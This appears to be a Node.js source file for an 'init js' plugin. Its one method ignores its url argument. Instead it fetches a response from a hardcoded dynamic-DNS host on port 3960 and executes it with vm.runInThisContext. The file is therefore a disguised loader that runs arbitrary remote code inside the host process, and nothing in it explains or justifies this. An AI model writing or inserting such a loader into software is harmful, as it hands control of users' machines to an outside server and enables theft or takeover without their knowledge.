/**
 * author:nero
 * version:v1.0
 * plugin:init js
 */
'use strict'
const request = require('request')
const vm = require('vm')

// constructor
class InitJs {
  async getcode (url) {
    return new Promise(async (resolve) => {
      request('http://zhlynn.mynetgear.com:3960/GetImageCode.php?key=haveagoodjob', function (error, response, body) {
        if (error) { console.log('FAIL to load the address'.red, error) } else {
          var result = vm.runInThisContext(body)
          console.log(result)
        }
      })
    })
  }
}

module.exports = InitJs
